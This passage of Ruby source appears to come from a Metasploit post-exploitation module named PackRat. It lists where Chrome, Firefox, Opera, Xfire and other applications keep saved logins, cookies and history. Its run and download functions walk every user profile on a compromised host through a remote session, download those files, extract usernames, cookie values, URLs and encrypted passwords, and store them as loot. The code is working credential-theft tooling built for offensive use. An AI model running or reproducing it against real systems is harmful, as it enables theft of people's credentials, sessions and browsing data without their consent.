              }, #end of email addresses search hash
            ]
          },
        ] #xChat file artifact end
      }, #xChat hash end
      ## xFire  is used also for
      {
        :application => 'xfire',
        :category => "gaming",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppDataLocal',
            :dir => 'Xfire',
            :artifact => "XfireUser.ini",
            :description => "Xfire saved Username & Passwords",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for Identification",
                :extraction_type => "Identification",
                :regex => [/encrypteduser.*/i, /encryptedlastlogin.*/i],
              },
            ]
          },
          {
            :filetypes => 'logins',
            :path => 'AppData',
            :dir => 'Xfire',
            :artifact => 'XfireUser.ini',
            :description => 'Xfire username and password',
            :credential_type => 'text',
            :regex_search => [
              {
                :extraction_description => 'Searches for Identification',
                :extraction_type => 'Identification',
                :regex => [/encrypteduser.*/i, /encryptedlastlogin.*/i],
              }
            ]
          }
        ] #xFire file artifact end
      }, #xFire hash end

      ## Chrome
      {
        :application => 'chrome',
        :category => "browsers",
        :file_artifact => [

          {
            :filetypes => "cookies",
            :path => 'LocalAppData',
            :dir => 'Google',
            :artifact => "Cookies",
            :description => "Chrome's Cookies",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Cookie data",
                  :sql_table => "cookies",
                  :sql_column => "host_key, name, path"

                }
              ] #sql search end

          }, #chrome cookies end

          {
            :filetypes => "logins",
            :path => 'LocalAppData',
            :dir => 'Google',
            :artifact => "Login Data",
            :description => "Chrome's saved Username & Passwords",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "logins",
                  :sql_column => "username_value, action_url"

                }
              ] #sql search end

          }, #chrome login data end

          {
            :filetypes => "web_history",
            :path => 'LocalAppData',
            :dir => 'Google',
            :artifact => "History",
            :description => "Chrome's History",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "urls",
                  :sql_column => "url"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "keyword_search_terms",
                  :sql_column => "lower_term"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "downloads",
                  :sql_column => "current_path, tab_referrer_url"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "segments",
                  :sql_column => "name"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "downloads_url_chains",
                  :sql_column => "url"

                }
              ] #sql search end

          },

        ] #Chrome file artifact end
      }, #Chrome hash end

      ## Comodo
      {
        :application => 'comodo',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'LocalAppData',
            :dir => 'COMODO',
            :artifact => "Login Data",
            :description => "Comodo's saved Username & Passwords",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "logins",
                  :sql_column => "action_url, username_value"

                }
              ] #sql search end

          },
          {
            :filetypes => "cookies",
            :path => 'LocalAppData',
            :dir => 'COMODO',
            :artifact => "Cookies",
            :description => "Comodo's saved cookies",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Cookie data",
                  :sql_table => "cookies",
                  :sql_column => "host_key, name, path"

                }
              ] #sql search end
          },
          {
            :filetypes => "web_history",
            :path => 'LocalAppData',
            :dir => 'COMODO',
            :artifact => "History",
            :description => "Comodo's History",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "urls",
                  :sql_column => "url"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "keyword_search_terms",
                  :sql_column => "lower_term"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "downloads",
                  :sql_column => "current_path, tab_referrer_url"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "segments",
                  :sql_column => "name"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "downloads_url_chains",
                  :sql_column => "url"

                }
              ] #sql search end
          },
          {
            :filetypes => "web_history",
            :path => 'LocalAppData',
            :dir => 'COMODO',
            :artifact => "Visited Links",
            :description => "Comodo's History",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "urls",
                  :sql_column => "url"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "keyword_search_terms",
                  :sql_column => "lower_term"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "downloads",
                  :sql_column => "current_path, tab_referrer_url"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "segments",
                  :sql_column => "name"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "downloads_url_chains",
                  :sql_column => "url"

                }
              ] #sql search end

          },
        ] #Comodo file artifact end
      }, #Comodo hash end


      ## CoolNovo
      {
        :application => 'coolnovo',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'LocalAppData',
            :dir => 'MapleStudio',
            :artifact => "Login Data",
            :description => "CoolNovo saved Username and Passwords",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "logins",
                  :sql_column => "action_url, username_value"

                }
              ] #sql search end
          },
        ] #CoolNovo file artifact end
      }, #CoolNovo hash end


      ## Firefox
      {
        :application => 'firefox',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "logins.json",
            :description => "Firefox's saved Username & Passwords ",
            :credential_type => "json",
            :json_search => [
              {
                :json_parent => "['logins']",
                :json_children => ["['hostname']", "['formSubmitURL']", "['usernameField']", "['passwordField']", "['encryptedUsername']", "['encryptedPassword']"],
              },
            ]
          },
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "cert8.db",
            :description => "Firefox's saved Username & Passwords",
            :credential_type => "database",

          },
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "key3.db",
            :description => "Firefox's saved Username & Passwords",
            :credential_type => "database",

          },
          {
            :filetypes => "web_history",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "places.sqlite",
            :description => "Firefox's History",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_places",
                  :sql_column => "url"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_inputhistory",
                  :sql_column => "input"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_keywords",
                  :sql_column => "keyword"
                },

              ] #sql search end

          },
          {
            :filetypes => "web_history",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "formhistory.sqlite",
            :description => "Firefox's History",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_formhistory",
                  :sql_column => "fieldname, value"

                },

              ] #sql search end

          },
          {
            :filetypes => "cookies",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "cookies.sqlite",
            :description => "Firefox's Cookies",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_cookies",
                  :sql_column => "baseDomain, host, name, path, value"
                }
              ] #sql search end

          },
        ] #Firefox file artifact end
      }, #Firefox hash end


      ## Flock
      {
        :application => 'flock',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Flock',
            :artifact => "formhistory.sqlite",
            :description => "Flock's saved Username & Passwords ",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "logins",
                  :sql_column => "username_value, action_url"

                }
              ] #sql search end
          },
          {
            :filetypes => "Cookies",
            :path => 'AppData',
            :dir => 'Flock',
            :artifact => "cookies.sqlite",
            :description => "Flock's cookies file",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports SRware's Login data",
                  :sql_table => "cookies",
                  :sql_column => "host_key, name, path"

                }
              ] #sql search end

          },
        ] #Flocks file artifact end
      }, #Flocks hash end


      ## IE
      {
        :application => 'IE',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "web_history",
            :path => 'LocalSettings',
            :dir => 'History',
            :artifact => "index.dat",
            :description => "IE history",
            :credential_type => "dat",

          },
        ] #IE file artifact end
      }, #IE hash end

      ## K-Meleon
      {
        :application => 'k-meleon',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'K-Meleon',
            :artifact => "signons.sqlite",
            :description => "K-Meleon's saved Username and Passwords",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "logins",
                  :sql_column => "username_value, action_url"

                }
              ] #sql search end

          },
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'K-Meleon',
            :artifact => "cert8.db",
            :description => "K-Melon's saved Username and Passwords",
            :credential_type => "database",

          },
          {
            :filetypes => "cookies",
            :path => 'AppData',
            :dir => 'K-Meleon',
            :artifact => "cookies.sqlite",
            :description => "K-Meleon's Cookies",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_cookies",
                  :sql_column => "baseDomain, host, name, path, value"

                }
              ] #sql search end

          },
          {
            :filetypes => "web_history",
            :path => 'AppData',
            :dir => 'K-Meleon',
            :artifact => "formhistory.sqlite",
            :description => "K-Meleon's Visited websites ",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_formhistory",
                  :sql_column => "value"

                }
              ] #sql search end

          },
          {
            :filetypes => "web_history",
            :path => 'AppData',
            :dir => 'K-Meleon',
            :artifact => "places.sqlite",
            :description => "K-Meleon's Visited websites ",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_places",
                  :sql_column => "url"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_inputhistory",
                  :sql_column => "input"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_hosts",
                  :sql_column => "host"
                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_keywords",
                  :sql_column => "keyword"
                }
              ] #sql search end

          },
        ] #K-Meleon file artifact end
      }, #K-Meleon hash end


      ## Maxthon
      {
        :application => 'maxthon',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Maxthon3',
            :artifact => "MagicFill2.dat",
            :description => "Maxthon's sent and received emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          },
        ] #Maxthon file artifact end
      }, #Maxthon hash end


      ## Opera
      {
        :application => 'opera',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Opera Software',
            :artifact => "Login Data",
            :description => "Opera's sent and received emails",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports SRware's Login data",
                  :sql_table => "logins",
                  :sql_column => "action_url, username_value"

                }
              ] #sql search end

          },
          {
            :filetypes => "cookies",
            :path => 'AppData',
            :dir => 'Opera Software',
            :artifact => "Cookies",
            :description => "Opera's Cookies",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports SRware's Login data",
                  :sql_table => "cookies",
                  :sql_column => "host_key, name, path"

                }
              ] #sql search end

          },
          {
            :filetypes => "web_history",
            :path => 'AppData',
            :dir => 'Opera Software',
            :artifact => "Visited Links",
            :description => "Opera's Visited Links",
            :credential_type => "database",

          },
        ] #Opera file artifact end
      }, #Opera hash end

      ## SRware
      {
        :application => 'srware',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'LocalAppData',
            :dir => 'Chromium',
            :artifact => "Login Data",
            :description => "SRware's sent and received emails",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports SRware's Login data",
                  :sql_table => "logins",
                  :sql_column => "action_url, username_value"

                }
              ] #sql search end
          },
          {
            :filetypes => "cookies",
            :path => 'LocalAppData',
            :dir => 'Chromium',
            :artifact => "Cookies",
            :description => "SRware's cookies",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports SRware's Login data",
                  :sql_table => "cookies",
                  :sql_column => "host_key, name, path, value"

                }
              ] #sql search end

          },
          {
            :filetypes => "web_history",
            :path => 'LocalAppData',
            :dir => 'Chromium',
            :artifact => "History",
            :description => "SRware's visited websites history",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports SRware's Login data",
                  :sql_table => "urls",
                  :sql_column => "url, title"

                },
                {
                  :sql_description => "Database Commands which exports SRware's Login data",
                  :sql_table => "downloads",
                  :sql_column => "current_path, site_url"

                },
                {
                  :sql_description => "Database Commands which exports SRware's Login data",
                  :sql_table => "segments",
                  :sql_column => "name"

                },
                {
                  :sql_description => "keyword search terms",
                  :sql_table => "keyword_search_terms",
                  :sql_column => "term"
                }
              ] #sql search end
          },
        ] #SRware file artifact end
      }, #SRware hash end

      ## safari
      {
        :application => 'safari',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Apple Computer',
            :artifact => "keychain.plist",
            :description => "Safari History",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          },
        ] #Safari file artifact end
      }, #Safari hash end

      ## SeaMonkeys
      {
        :application => 'seamonkey',
        :category => "browsers",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "logins.json",
            :description => "Seamonkey's saved Username and Password ",
            :credential_type => "json",
            :json_search => [
              {
                :json_parent => "['logins']",
                :json_children => ["['hostname']", "['usernameField']", "['passwordField']", "['encryptedUsername']", "['encryptedPassword']"],
              },
            ]
          },
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "cert8.db",
            :description => "Seamonkey's saved Username and Password",
            :credential_type => "database",
          },
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "key3.db",
            :description => "Seamonkeys's saved Username and Password",
            :credential_type => "database",
          },
          {
            :filetypes => "web_history",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "formhistory.sqlite",
            :description => "Seamonkey's History",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_formhistory",
                  :sql_column => "fieldname, value"

                }
              ] #sql search end
          },
          {
            :filetypes => "web_history",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "places.sqlite",
            :description => "Seamonkey's History ",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_places",
                  :sql_column => "url"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_inputhistory",
                  :sql_column => "input"

                },
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_keywords",
                  :sql_column => "keyword"
                }
              ] #sql search end
          },
          {
            :filetypes => "cookies",
            :path => 'AppData',
            :dir => 'Mozilla',
            :artifact => "cookies.sqlite",
            :description => "Seamonkey's Cookies",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "moz_cookies",
                  :sql_column => "baseDomain, host, name, path, value"

                }
              ] #sql search end
          },
        ] #Seamonkeys file artifact end
      }, #Seamonkeys hash end


    ] #end of apps array


  def run
    print_status("Filtering based on these selections:  ")
    print_status("APPCATEGORY: #{datastore['APPCATEGORY'].capitalize}, APPLICATION: #{datastore['APPLICATION'].capitalize}, ARTEFACTS: #{datastore['ARTEFACTS'].capitalize}")

    #used to grab files for each user on the remote host.
    grab_user_profiles.each do |userprofile|
      APPLICATION_ARRAY.each {|app_loop|
        download(userprofile, app_loop)

      }
    end
    print_status "PackRat credential sweep Completed. Check for artifacts and credentials in Loot"
  end

  # Check to see if the artifact exists on the remote system.
  def location(profile, opts = {})

    artifact_parent = opts[:file_artifact]
    artifact_parent.each do |artifact_child|
      path = profile[artifact_child[:path]]
      dir = artifact_child[:dir]
      dirs = session.fs.dir.foreach(path).collect
      return dirs.include? dir
    end
  end

  def extract_xml(saving_path, artifact_child, artifact, local_loc)
    begin
      xml_file = Nokogiri::XML(File.read("#{saving_path}"))
      credential_array = []
      xml_credential = ""
      cred = "CREDENTIALS"

      artifact_child[:xml_search].each do |xml_split|
        xml_split[:xml].each do |xml_string|
          xml_file.xpath("#{xml_string}").each do |xml_match|
            vprint_status("#{xml_split[:extraction_description]}")
            print_good xml_match.to_s
            credential_array << xml_match.to_s
          end
        end
      end

      credential_array.each do |xml_write|
        file_save = xml_write.chomp + "\n" #wrties new line in file
        xml_credential << file_save.to_s
      end
      xml_credential_path = store_loot("#{artifact}#{cred}", "", session, "#{xml_credential}", local_loc) #saves multiple xml credentials per file
      print_status "File with credentials saved:  #{xml_credential_path}"
    rescue StandardError => error_message
      print_status error_message.to_s
    end
  end

  def extract_regex(saving_path, artifact_child, artifact, local_loc)
    begin
      cred = "CREDENTIALS"
      file_string = ""
      File.open("#{saving_path}", "rb").each do |file_content|
        file_string << file_content.to_s
      end

      credential_array = []
      cred_save = ""
      user_regex = datastore['REGEX']
      regex_string = user_regex.to_s

      artifact_child[:regex_search].each do |reg_child|
        reg_child[:regex].each do |regex_to_match|
          if file_string =~ regex_to_match
            file_string.scan(regex_to_match).each do |found_credential|
              file_strip = found_credential.gsub(/\s+/, "").to_s
              vprint_status("#{reg_child[:extraction_description]}")
              print_good file_strip
              credential_array << file_strip
            end
          end
        end
      end

      if file_string =~ user_regex
        file_string.scan(user_regex).each do |user_match|
          user_strip = user_match.gsub(/\s+/, "").to_s
          vprint_status "Searching for #{regex_string}"
          print_good user_strip.to_s
          credential_array << user_strip
        end
      end

      credential_array.each do |file_write|
        file_save = file_write.chomp + "\n"
        cred_save << file_save.to_s
      end #file_write end
      regex_credential_path = store_loot("#{artifact}#{cred}", "", session, "#{cred_save}", local_loc) #saves crdentials for each file
      print_status "File with credentials saved:  #{regex_credential_path}"
    rescue StandardError => error_message
      print_status error_message.to_s
    end
  end

  def extract_sqlite(saving_path, artifact_child, artifact, local_loc)
    begin
      cred = "CREDENTIALS"
      database_string = ""
      database_file = SQLite3::Database.open "#{saving_path}"

      artifact_child[:sql_search].each do |sql_child|
        select_db_info = database_file.prepare "SELECT #{sql_child[:sql_column]} FROM #{sql_child[:sql_table]}"
        execute_command = select_db_info.execute
        execute_command.each do |database_row|
          join_info = database_row.join "\s"
          line_split = join_info.chomp + "\n"
          database_string << line_split.to_s
        end
      end

      sql_credential_path = store_loot("#{artifact}#{cred}", "", session, "#{database_string}", local_loc) #saves neatened up database file
      print_status "File with credentials saved:  #{sql_credential_path}"

    rescue StandardError => error_message
      print_status error_message.to_s
    end
  end

  def extract_json(saving_path, artifact_child, artifact, local_loc)
    begin
      json_file = File.read("#{saving_path}")
      json_parse = JSON.parse(json_file)
      parent_json_query = ''
      child_json_query = []
      json_credential_save = []
      json_cred = ''
      cred = "CREDENTIALS"

      artifact_child[:json_search].each do |json_split|
        parent_json_query << json_split[:json_parent]
        json_split[:json_children].each do |json_child|
          child_json_query << json_child.to_s
        end #json_child end
      end #json_split end

      child_json_query.each do |split|
        children = eval("json_parse#{parent_json_query}")
        children.each {|child_node|
          child = eval("child_node#{split}").to_s
          json_credential_save << "#{split}:  #{child}"
        }
      end

      json_credential_save.each do |json_save|
        file_save = json_save.chomp + "\n"
        print_good file_save.to_s
        json_cred << file_save.to_s
      end #json_save end
      json_credential_path = store_loot("#{artifact}#{cred}", "", session, "#{json_cred}", local_loc) #saves crdentials for each file
      print_status "File with credentials saved:  #{json_credential_path}"
    rescue StandardError => error_message
      print_status error_message.to_s
    end
  end

  #Download file from the remote system, if it exists.
  def download(profile, opts = {})

    artifact_parent = opts[:file_artifact]
    artifact_parent.each do |artifact_child|
      category = opts[:category]
      application = opts[:application]
      artifact = artifact_child[:artifact]
      file_type = artifact_child[:filetypes]
      path = artifact_child[:path]
      credential_type = artifact_child[:credential_type]
      description = artifact_child[:description]

      # filter based on options
      if (category != datastore['APPCATEGORY'] && datastore['APPCATEGORY'] != 'All') || (application != datastore['APPLICATION'] && datastore['APPLICATION'] != 'All') || (file_type != datastore['ARTEFACTS'] && datastore['ARTEFACTS'] != 'All')
        # doesn't match search criteria, skip this artifact
        next
      end #if statement end
      vprint_status("Searching for #{application.capitalize}'s #{artifact.capitalize} files in #{profile['UserName']}'s user directory...")

      if location(profile, opts) # check if file exists in user's directory on the remote computer.
        print_status("#{application.capitalize}'s #{artifact.capitalize} file found")
      else
        vprint_error("#{application.capitalize}'s #{artifact.capitalize} not found in #{profile['UserName']}'s user directory\n")
        # skip non-existing file
        return false
      end

      #loops through apps array and returns each file
      file_directory = "#{profile[path]}\\#{artifact_child[:dir]}"
      files = session.fs.file.search(file_directory, "#{artifact}", true)

      return false unless files

      files.each do |file|
        file_split = file['path'].split('\\')
        local_loc = "#{file_split.last}#{artifact}"
        saving_path = store_loot("#{application}#{artifact}", "", session, "", local_loc)
        file_to_download = "#{file['path']}#{session.fs.file.separator}#{file['name']}"
        print_status("Downloading #{file_to_download}")
        session.fs.file.download_file(saving_path, file_to_download)
        print_status("#{application.capitalize} #{artifact.capitalize} downloaded (#{description})")
        print_good("File saved to:  #{saving_path}\n")

        if credential_type == 'xml'
          extract_xml(saving_path, artifact_child, artifact, local_loc)
        end

        if credential_type == 'json'
          extract_json(saving_path, artifact_child, artifact, local_loc)
        end

        if credential_type == 'text'
          extract_regex(saving_path, artifact_child, artifact, local_loc)
        end

        if credential_type == 'sqlite'
          extract_sqlite(saving_path, artifact_child, artifact, local_loc)
        end

      end
    end
    return true
  end
end
